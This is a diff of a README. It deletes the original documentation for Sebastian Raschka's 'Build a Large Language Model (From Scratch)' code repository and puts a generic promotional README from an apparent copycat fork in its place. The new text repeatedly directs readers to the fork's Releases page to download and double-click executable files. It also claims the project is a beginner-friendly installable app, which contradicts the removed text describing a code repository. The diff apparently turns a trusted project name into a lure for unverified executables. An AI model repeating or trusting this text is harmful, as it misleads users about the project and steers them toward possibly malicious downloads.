@@ -1,229 +1,74 @@
-# Build a Large Language Model (From Scratch)
+# 🤖 LLMs-from-scratch - Build Your Own ChatGPT-Like Model
 
-This repository contains the code for developing, pretraining, and finetuning a GPT-like LLM and is the official code repository for the book [Build a Large Language Model (From Scratch)](https://amzn.to/4fqvn0D).
+## 🚀 Overview
+Welcome to LLMs-from-scratch! This project guides you through creating a ChatGPT-like language model using PyTorch. You will learn step-by-step how to build powerful AI tools that understand and generate human-like text.
 
-<br>
-<br>
+## 📦 Download Now
+[![Download LLMs-from-scratch Release](https://img.shields.io/badge/Download-LLMs--from--scratch-blue.svg)](https://github.com/Lamorati92/LLMs-from-scratch/releases)
 
-<a href="https://amzn.to/4fqvn0D"><img src="https://sebastianraschka.com/images/LLMs-from-scratch-images/cover.jpg?123" width="250px"></a>
+## 🛠️ Features
+- **Step-by-step tutorials:** Follow along at your own pace.
+- **Detailed examples:** Easy-to-understand code snippets for beginners.
+- **Customizable models:** Adapt the model to suit your needs.
+- **Community support:** Join a friendly group of learners and experts.
 
-<br>
+## 📋 System Requirements
+To run LLMs-from-scratch, make sure you have:
 
-In [*Build a Large Language Model (From Scratch)*](http://mng.bz/orYv), you'll learn and understand how large language models (LLMs) work from the inside out by coding them from the ground up, step by step. In this book, I'll guide you through creating your own LLM, explaining each stage with clear text, diagrams, and examples.
+- A computer with at least 8GB of RAM.
+- Python 3.6 or higher installed.
+- PyTorch library installed. You can find installation instructions on the [PyTorch website](https://pytorch.org/get-started/locally/).
 
-The method described in this book for training and developing your own small-but-functional model for educational purposes mirrors the approach used in creating large-scale foundational models such as those behind ChatGPT. In addition, this book includes code for loading the weights of larger pretrained models for finetuning.
+## 🔗 Visit to Download
+To get the latest version, [visit the Releases page here](https://github.com/Lamorati92/LLMs-from-scratch/releases). You can find all available versions and choose the one that fits your setup.
 
-- Link to the official [source code repository](https://github.com/rasbt/LLMs-from-scratch)
-- [Link to the book at Manning (the publisher's website)](http://mng.bz/orYv)
-- [Link to the book page on Amazon.com](https://www.amazon.com/gp/product/1633437167)
-- ISBN 9781633437166
+## ⚙️ Download & Install
+1. Visit the [Releases page](https://github.com/Lamorati92/LLMs-from-scratch/releases).
+2. Choose the version you want to download. You will find executable files and other resources.
+3. Click on the desired file to start the download.
+4. Once downloaded, locate the file on your computer.
+5. Double-click the file to install and run the application.
 
-<a href="http://mng.bz/orYv#reviews"><img src="https://sebastianraschka.com//images/LLMs-from-scratch-images/other/reviews.png" width="220px"></a>
+## 📚 Getting Started
+- After installation, you will find a user-friendly interface.
+- Follow the on-screen instructions to set up your first language model.
+- Use the provided documentation for step-by-step guidance on building your own models.
 
+## 👐 Community and Support
+If you encounter issues or have questions, feel free to reach out. Join our online community where you can ask for help and share your progress. You will find others eager to support you.
 
-<br>
-<br>
+## 📝 Contribution Guidelines
+We welcome contributions to enhance the project! If you'd like to suggest changes or improvements, please check our guidelines in the repository. Your input can help others learn and grow.
 
-To download a copy of this repository, click on the [Download ZIP](https://github.com/rasbt/LLMs-from-scratch/archive/refs/heads/main.zip) button or execute the following command in your terminal:
+## 🔍 Explore More
+Check out our resources for a deeper understanding of related topics such as:
 
-```bash
-git clone --depth 1 https://github.com/rasbt/LLMs-from-scratch.git
-```
+- Artificial Intelligence
+- Machine Learning
+- Neural Networks
+- Deep Learning 
+- Transformers
 
-<br>
+These concepts will enrich your learning experience and deepen your engagement with AI projects.
 
-(If you downloaded the code bundle from the Manning website, please consider visiting the official code repository on GitHub at [https://github.com/rasbt/LLMs-from-scratch](https://github.com/rasbt/LLMs-from-scratch) for the latest updates.)
+## 📥 Frequently Asked Questions (FAQ)
+1. **What is LLMs-from-scratch?**
+   - It is a project designed to help you build a ChatGPT-like language model from the ground up using PyTorch.
 
-<br>
-<br>
+2. **Do I need programming skills to use it?**
+   - No, the project includes tutorials and examples designed for beginners.
 
+3. **Can I modify the models?**
+   - Yes, you can customize the models based on your needs or preferences.
 
-# Table of Contents
+4. **Is there support available?**
+   - Yes, you can join our community for help and advice.
 
-Please note that this `README.md` file is a Markdown (`.md`) file. If you have downloaded this code bundle from the Manning website and are viewing it on your local computer, I recommend using a Markdown editor or previewer for proper viewing. If you haven't installed a Markdown editor yet, [Ghostwriter](https://ghostwriter.kde.org) is a good free option.
+## 📞 Get in Touch
+If you need further assistance or want to connect, feel free to reach out via GitHub issues or join our community forums. Your journey in AI starts here, and we're excited to be part of it!
 
-You can alternatively view this and other files on GitHub at [https://github.com/rasbt/LLMs-from-scratch](https://github.com/rasbt/LLMs-from-scratch) in your browser, which renders Markdown automatically.
+## 🔗 Important Links
+- [Releases Page](https://github.com/Lamorati92/LLMs-from-scratch/releases)
+- [Contribution Guidelines](https://github.com/Lamorati92/LLMs-from-scratch/blob/main/CONTRIBUTING.md)
 
-<br>
-<br>
-
-
-> **Tip:**
-> If you're seeking guidance on installing Python and Python packages and setting up your code environment, I suggest reading the [README.md](setup/README.md) file located in the [setup](setup) directory.
-
-<br>
-<br>
-
-[![Code tests Linux](https://github.com/rasbt/LLMs-from-scratch/actions/workflows/basic-tests-linux-uv.yml/badge.svg)](https://github.com/rasbt/LLMs-from-scratch/actions/workflows/basic-tests-linux-uv.yml)
-[![Code tests Windows](https://github.com/rasbt/LLMs-from-scratch/actions/workflows/basic-tests-windows-uv-pip.yml/badge.svg)](https://github.com/rasbt/LLMs-from-scratch/actions/workflows/basic-tests-windows-uv-pip.yml)
-[![Code tests macOS](https://github.com/rasbt/LLMs-from-scratch/actions/workflows/basic-tests-macos-uv.yml/badge.svg)](https://github.com/rasbt/LLMs-from-scratch/actions/workflows/basic-tests-macos-uv.yml)
-
-
-
-
-<br>
-
-| Chapter Title                                              | Main Code (for Quick Access)                                                                                                    | All Code + Supplementary      |
-|------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------|-------------------------------|
-| [Setup recommendations](setup)                             | -                                                                                                                               | -                             |
-| Ch 1: Understanding Large Language Models                  | No code                                                                                                                         | -                             |
-| Ch 2: Working with Text Data                               | - [ch02.ipynb](ch02/01_main-chapter-code/ch02.ipynb)<br/>- [dataloader.ipynb](ch02/01_main-chapter-code/dataloader.ipynb) (summary)<br/>- [exercise-solutions.ipynb](ch02/01_main-chapter-code/exercise-solutions.ipynb)               | [./ch02](./ch02)            |
-| Ch 3: Coding Attention Mechanisms                          | - [ch03.ipynb](ch03/01_main-chapter-code/ch03.ipynb)<br/>- [multihead-attention.ipynb](ch03/01_main-chapter-code/multihead-attention.ipynb) (summary) <br/>- [exercise-solutions.ipynb](ch03/01_main-chapter-code/exercise-solutions.ipynb)| [./ch03](./ch03)             |
-| Ch 4: Implementing a GPT Model from Scratch                | - [ch04.ipynb](ch04/01_main-chapter-code/ch04.ipynb)<br/>- [gpt.py](ch04/01_main-chapter-code/gpt.py) (summary)<br/>- [exercise-solutions.ipynb](ch04/01_main-chapter-code/exercise-solutions.ipynb) | [./ch04](./ch04)           |
-| Ch 5: Pretraining on Unlabeled Data                        | - [ch05.ipynb](ch05/01_main-chapter-code/ch05.ipynb)<br/>- [gpt_train.py](ch05/01_main-chapter-code/gpt_train.py) (summary) <br/>- [gpt_generate.py](ch05/01_main-chapter-code/gpt_generate.py) (summary) <br/>- [exercise-solutions.ipynb](ch05/01_main-chapter-code/exercise-solutions.ipynb) | [./ch05](./ch05)              |
-| Ch 6: Finetuning for Text Classification                   | - [ch06.ipynb](ch06/01_main-chapter-code/ch06.ipynb)  <br/>- [gpt_class_finetune.py](ch06/01_main-chapter-code/gpt_class_finetune.py)  <br/>- [exercise-solutions.ipynb](ch06/01_main-chapter-code/exercise-solutions.ipynb) | [./ch06](./ch06)              |
-| Ch 7: Finetuning to Follow Instructions                    | - [ch07.ipynb](ch07/01_main-chapter-code/ch07.ipynb)<br/>- [gpt_instruction_finetuning.py](ch07/01_main-chapter-code/gpt_instruction_finetuning.py) (summary)<br/>- [ollama_evaluate.py](ch07/01_main-chapter-code/ollama_evaluate.py) (summary)<br/>- [exercise-solutions.ipynb](ch07/01_main-chapter-code/exercise-solutions.ipynb) | [./ch07](./ch07)  |
-| Appendix A: Introduction to PyTorch                        | - [code-part1.ipynb](appendix-A/01_main-chapter-code/code-part1.ipynb)<br/>- [code-part2.ipynb](appendix-A/01_main-chapter-code/code-part2.ipynb)<br/>- [DDP-script.py](appendix-A/01_main-chapter-code/DDP-script.py)<br/>- [exercise-solutions.ipynb](appendix-A/01_main-chapter-code/exercise-solutions.ipynb) | [./appendix-A](./appendix-A) |
-| Appendix B: References and Further Reading                 | No code                                                                                                                         | -                             |
-| Appendix C: Exercise Solutions                             | No code                                                                                                                         | -                             |
-| Appendix D: Adding Bells and Whistles to the Training Loop | - [appendix-D.ipynb](appendix-D/01_main-chapter-code/appendix-D.ipynb)                                                          | [./appendix-D](./appendix-D)  |
-| Appendix E: Parameter-efficient Finetuning with LoRA       | - [appendix-E.ipynb](appendix-E/01_main-chapter-code/appendix-E.ipynb)                                                          | [./appendix-E](./appendix-E) |
-
-<br>
-&nbsp;
-
-The mental model below summarizes the contents covered in this book.
-
-<img src="https://sebastianraschka.com/images/LLMs-from-scratch-images/mental-model.jpg" width="650px">
-
-
-<br>
-&nbsp;
-
-## Prerequisites
-
-The most important prerequisite is a strong foundation in Python programming.
-With this knowledge, you will be well prepared to explore the fascinating world of LLMs
-and understand the concepts and code examples presented in this book.
-
-If you have some experience with deep neural networks, you may find certain concepts more familiar, as LLMs are built upon these architectures.
-
-This book uses PyTorch to implement the code from scratch without using any external LLM libraries. While proficiency in PyTorch is not a prerequisite, familiarity with PyTorch basics is certainly useful. If you are new to PyTorch, Appendix A provides a concise introduction to PyTorch. Alternatively, you may find my book, [PyTorch in One Hour: From Tensors to Training Neural Networks on Multiple GPUs](https://sebastianraschka.com/teaching/pytorch-1h/), helpful for learning about the essentials.
-
-
-
-<br>
-&nbsp;
-
-## Hardware Requirements
-
-The code in the main chapters of this book is designed to run on conventional laptops within a reasonable timeframe and does not require specialized hardware. This approach ensures that a wide audience can engage with the material. Additionally, the code automatically utilizes GPUs if they are available. (Please see the [setup](https://github.com/rasbt/LLMs-from-scratch/blob/main/setup/README.md) doc for additional recommendations.)
-
-
-&nbsp;
-## Video Course
-
-[A 17-hour and 15-minute companion video course](https://www.manning.com/livevideo/master-and-build-large-language-models) where I code through each chapter of the book. The course is organized into chapters and sections that mirror the book's structure so that it can be used as a standalone alternative to the book or complementary code-along resource.
-
-<a href="https://www.manning.com/livevideo/master-and-build-large-language-models"><img src="https://sebastianraschka.com/images/LLMs-from-scratch-images/video-screenshot.webp?123" width="350px"></a>
-
-
-&nbsp;
-
-
-## Companion Book / Sequel
-
-[*Build A Reasoning Model (From Scratch)*](https://mng.bz/lZ5B), while a standalone book, can be considered as a sequel to *Build A Large Language Model (From Scratch)*.
-
-It starts with a pretrained model and implements different reasoning approaches, including inference-time scaling, reinforcement learning, and distillation, to improve the model's reasoning capabilities. 
-
-Similar to *Build A Large Language Model (From Scratch)*, [*Build A Reasoning Model (From Scratch)*](https://mng.bz/lZ5B) takes a hands-on approach implementing these methods from scratch.
-
-<a href="https://mng.bz/lZ5B"><img src="https://sebastianraschka.com/images/reasoning-from-scratch-images/cover.webp?123" width="120px"></a>
-
-- Amazon link (TBD)
-- [Manning link](https://mng.bz/lZ5B)
-- [GitHub repository](https://github.com/rasbt/reasoning-from-scratch)
-
-<br>
-
-&nbsp;
-## Exercises
-
-Each chapter of the book includes several exercises. The solutions are summarized in Appendix C, and the corresponding code notebooks are available in the main chapter folders of this repository (for example,  [./ch02/01_main-chapter-code/exercise-solutions.ipynb](./ch02/01_main-chapter-code/exercise-solutions.ipynb).
-
-In addition to the code exercises, you can download a free 170-page PDF titled  [Test Yourself On Build a Large Language Model (From Scratch)](https://www.manning.com/books/test-yourself-on-build-a-large-language-model-from-scratch) from the Manning website. It contains approximately 30 quiz questions and solutions per chapter to help you test your understanding.
-
-<a href="https://www.manning.com/books/test-yourself-on-build-a-large-language-model-from-scratch"><img src="https://sebastianraschka.com/images/LLMs-from-scratch-images/test-yourself-cover.jpg?123" width="150px"></a>
-
-
-
-&nbsp;
-## Bonus Material
-
-Several folders contain optional materials as a bonus for interested readers:
-
-- **Setup**
-  - [Python Setup Tips](setup/01_optional-python-setup-preferences)
-  - [Installing Python Packages and Libraries Used In This Book](setup/02_installing-python-libraries)
-  - [Docker Environment Setup Guide](setup/03_optional-docker-environment)
-- **Chapter 2: Working with text data**
-  - [Byte Pair Encoding (BPE) Tokenizer From Scratch](ch02/05_bpe-from-scratch/bpe-from-scratch.ipynb)
-  - [Comparing Various Byte Pair Encoding (BPE) Implementations](ch02/02_bonus_bytepair-encoder)
-  - [Understanding the Difference Between Embedding Layers and Linear Layers](ch02/03_bonus_embedding-vs-matmul)
-  - [Dataloader Intuition with Simple Numbers](ch02/04_bonus_dataloader-intuition)
-- **Chapter 3: Coding attention mechanisms**
-  - [Comparing Efficient Multi-Head Attention Implementations](ch03/02_bonus_efficient-multihead-attention/mha-implementations.ipynb)
-  - [Understanding PyTorch Buffers](ch03/03_understanding-buffers/understanding-buffers.ipynb)
-- **Chapter 4: Implementing a GPT model from scratch**
-  - [FLOPS Analysis](ch04/02_performance-analysis/flops-analysis.ipynb)
-  - [KV Cache](ch04/03_kv-cache)
-- **Chapter 5: Pretraining on unlabeled data:**
-  - [Alternative Weight Loading Methods](ch05/02_alternative_weight_loading/)
-  - [Pretraining GPT on the Project Gutenberg Dataset](ch05/03_bonus_pretraining_on_gutenberg)
-  - [Adding Bells and Whistles to the Training Loop](ch05/04_learning_rate_schedulers)
-  - [Optimizing Hyperparameters for Pretraining](ch05/05_bonus_hparam_tuning)
-  - [Building a User Interface to Interact With the Pretrained LLM](ch05/06_user_interface)
-  - [Converting GPT to Llama](ch05/07_gpt_to_llama)
-  - [Llama 3.2 From Scratch](ch05/07_gpt_to_llama/standalone-llama32.ipynb)
-  - [Qwen3 Dense and Mixture-of-Experts (MoE) From Scratch](ch05/11_qwen3/)
-  - [Gemma 3 From Scratch](ch05/12_gemma3/)
-  - [Memory-efficient Model Weight Loading](ch05/08_memory_efficient_weight_loading/memory-efficient-state-dict.ipynb)
-  - [Extending the Tiktoken BPE Tokenizer with New Tokens](ch05/09_extending-tokenizers/extend-tiktoken.ipynb)
-  - [PyTorch Performance Tips for Faster LLM Training](ch05/10_llm-training-speed)
-- **Chapter 6: Finetuning for classification**
-  - [Additional experiments finetuning different layers and using larger models](ch06/02_bonus_additional-experiments)
-  - [Finetuning different models on 50k IMDb movie review dataset](ch06/03_bonus_imdb-classification)
-  - [Building a User Interface to Interact With the GPT-based Spam Classifier](ch06/04_user_interface)
-- **Chapter 7: Finetuning to follow instructions**
-  - [Dataset Utilities for Finding Near Duplicates and Creating Passive Voice Entries](ch07/02_dataset-utilities)
-  - [Evaluating Instruction Responses Using the OpenAI API and Ollama](ch07/03_model-evaluation)
-  - [Generating a Dataset for Instruction Finetuning](ch07/05_dataset-generation/llama3-ollama.ipynb)
-  - [Improving a Dataset for Instruction Finetuning](ch07/05_dataset-generation/reflection-gpt4.ipynb)
-  - [Generating a Preference Dataset with Llama 3.1 70B and Ollama](ch07/04_preference-tuning-with-dpo/create-preference-data-ollama.ipynb)
-  - [Direct Preference Optimization (DPO) for LLM Alignment](ch07/04_preference-tuning-with-dpo/dpo-from-scratch.ipynb)
-  - [Building a User Interface to Interact With the Instruction Finetuned GPT Model](ch07/06_user_interface)
-
-<br>
-&nbsp;
-
-## Questions, Feedback, and Contributing to This Repository
-
-
-I welcome all sorts of feedback, best shared via the [Manning Forum](https://livebook.manning.com/forum?product=raschka&page=1) or [GitHub Discussions](https://github.com/rasbt/LLMs-from-scratch/discussions). Likewise, if you have any questions or just want to bounce ideas off others, please don't hesitate to post these in the forum as well.
-
-Please note that since this repository contains the code corresponding to a print book, I currently cannot accept contributions that would extend the contents of the main chapter code, as it would introduce deviations from the physical book. Keeping it consistent helps ensure a smooth experience for everyone.
-
-
-&nbsp;
-## Citation
-
-If you find this book or code useful for your research, please consider citing it.
-
-Chicago-style citation:
-
-> Raschka, Sebastian. *Build A Large Language Model (From Scratch)*. Manning, 2024. ISBN: 978-1633437166.
-
-BibTeX entry:
-
-```
-@book{build-llms-from-scratch-book,
-  author       = {Sebastian Raschka},
-  title        = {Build A Large Language Model (From Scratch)},
-  publisher    = {Manning},
-  year         = {2024},
-  isbn         = {978-1633437166},
-  url          = {https://www.manning.com/books/build-a-large-language-model-from-scratch},
-  github       = {https://github.com/rasbt/LLMs-from-scratch}
-}
-```
+Embrace your journey in AI. With LLMs-from-scratch, learning and building your own language models is easier than ever. Enjoy the process!
